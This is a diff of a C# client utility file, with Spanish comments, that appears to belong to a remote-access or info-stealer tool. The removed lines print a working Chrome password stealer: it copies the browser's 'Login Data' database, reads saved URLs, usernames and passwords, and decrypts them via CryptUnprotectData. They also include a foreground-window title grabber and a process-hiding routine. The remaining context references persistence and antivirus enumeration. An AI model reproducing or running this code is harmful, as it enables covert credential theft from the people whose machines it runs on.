@@ -1,10 +1,8 @@
-﻿using Client.Native;
-using Microsoft.Win32;
+﻿using Microsoft.Win32;
 using System.Diagnostics;
 using System.Management;
 using System.Text;
 using System.Data.SQLite;
-using static Client.Native.NativeMethods;
 using System.Runtime.InteropServices;
 
 
@@ -51,10 +49,6 @@ namespace Client.Util
                 Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Microsoft", "Edge", "Application", "msedge.exe"),
                 Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Edge", "SxS", "Application", "msedge.exe")
             };
-            browsersList.AppendLine("\n");
-            browsersList.AppendLine("====================================================================");
-            browsersList.AppendLine("|                       Navegadores Instalados                     |");
-            browsersList.AppendLine("====================================================================");
 
             foreach (var browserPath in browserPaths)
             {
@@ -64,8 +58,7 @@ namespace Client.Util
                 }
             }
 
-            browsersList.AppendLine("====================================================================");
-
+     
             return browsersList.ToString();
         }
 
@@ -97,18 +90,7 @@ namespace Client.Util
         }
 
 
-        public static string getWindowsActiveTitle()
-        {
-
-            StringBuilder windowTitle = new StringBuilder(256);
-            IntPtr handle = GetForegroundWindow();
-
-            if (GetWindowText(handle, windowTitle, windowTitle.Capacity) > 0) { return windowTitle.ToString(); }
-            else { return "No se ha podido obtener el nombre de la ventana activa"; }
-
-
-
-        }
+      
        
         public static void AddPersistence()
         {
@@ -150,22 +132,7 @@ namespace Client.Util
             }
         }
 
-        public static void HideFromTaskManager()
-        {
-            try
-            {
-                // Obtener el handle del proceso actual
-                IntPtr hProcess = Process.GetCurrentProcess().Handle;
-
-                // Ocultar el proceso del Administrador de Tareas
-                bool success = NativeMethods.SetProcessHideFromDebugger(hProcess);
-               
-            }
-            catch (Exception ex)
-            {
-                Debug.WriteLine(ex.Message);
-            }
-        }
+      
 
         public static string ListInstalledAntivirus()
         {
@@ -209,114 +176,7 @@ namespace Client.Util
             return antivirusList.ToString();
         }
 
-        public static List<ChromePassword> getChromePasswords()
-        {
-            List<ChromePassword> passwords = new List<ChromePassword>();
-            string LOGIN_DATA_PATH = "Google\\Chrome\\User Data\\Default\\Login Data";
-            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-            string loginDataPath = Path.Combine(localAppData, LOGIN_DATA_PATH);
-
-            if (!File.Exists(loginDataPath))
-            {
-                Debug.WriteLine("El archivo de datos de inicio de sesión no se encuentra en la ruta especificada.");
-                return passwords;
-            }
-
-            string tempLoginDataPath = Path.Combine(Path.GetTempPath(), "Login Data");
-
-            try
-            {
-                File.Copy(loginDataPath, tempLoginDataPath, true);
-            }
-            catch (Exception ex)
-            {
-                Debug.WriteLine($"Error al copiar el archivo de base de datos: {ex.Message}");
-                return passwords;
-            }
-
-            string connectionString = $"Data Source={tempLoginDataPath};Version=3;";
-            try
-            {
-                using (var conn = new SQLiteConnection(connectionString))
-                {
-                    conn.Open();
-
-                    using (SQLiteCommand cmd = new SQLiteCommand(conn))
-                    {
-                        cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
-                        using (SQLiteDataReader reader = cmd.ExecuteReader())
-                        {
-                            while (reader.Read())
-                            {
-                                string url = reader["action_url"]?.ToString();
-                                string username = reader["username_value"]?.ToString();
-                                byte[] passwordBlob = reader["password_value"] as byte[];
-
-                                if (url == null || username == null || passwordBlob == null)
-                                {
-                                    Debug.WriteLine("Se encontró un valor nulo en la base de datos.");
-                                    continue;
-                                }
-
-                                string decryptedPassword = DecryptPassword(passwordBlob);
-
-                                passwords.Add(new ChromePassword
-                                {
-                                    URL = url,
-                                    Username = username,
-                                    Password = decryptedPassword
-                                });
-                            }
-                        }
-                    }
-                    conn.Close();
-                }
-            }
-            catch (Exception ex)
-            {
-                Debug.WriteLine($"Error al acceder a la base de datos: {ex.Message}");
-            }
-            finally
-            {
-                if (File.Exists(tempLoginDataPath))
-                {
-                    File.Delete(tempLoginDataPath);
-                }
-            }
-
-            return passwords;
-
-        }
-
-        private static string DecryptPassword(byte[] encryptedData)
-        {
-            DATA_BLOB dataIn = new DATA_BLOB
-            {
-                pbData = Marshal.AllocHGlobal(encryptedData.Length),
-                cbData = encryptedData.Length
-            };
-            Marshal.Copy(encryptedData, 0, dataIn.pbData, encryptedData.Length);
-
-            DATA_BLOB dataOut = new DATA_BLOB();
-            CRYPTPROTECT_PROMPTSTRUCT prompt = new CRYPTPROTECT_PROMPTSTRUCT
-            {
-                cbSize = Marshal.SizeOf(typeof(CRYPTPROTECT_PROMPTSTRUCT)),
-                dwPromptFlags = 0,
-                hwndApp = IntPtr.Zero,
-                szPrompt = null
-            };
-
-            
-            CryptUnprotectData(ref dataIn, null, ref dataIn, IntPtr.Zero, ref prompt, 0, ref dataOut);
-            byte[] decryptedData = new byte[dataOut.cbData];
-            Marshal.Copy(dataOut.pbData, decryptedData, 0, dataOut.cbData);
-
-            Marshal.FreeHGlobal(dataIn.pbData);
-            Marshal.FreeHGlobal(dataOut.pbData);
-
-            return Encoding.UTF8.GetString(decryptedData);
-        }
-
+   
 
     }
 }
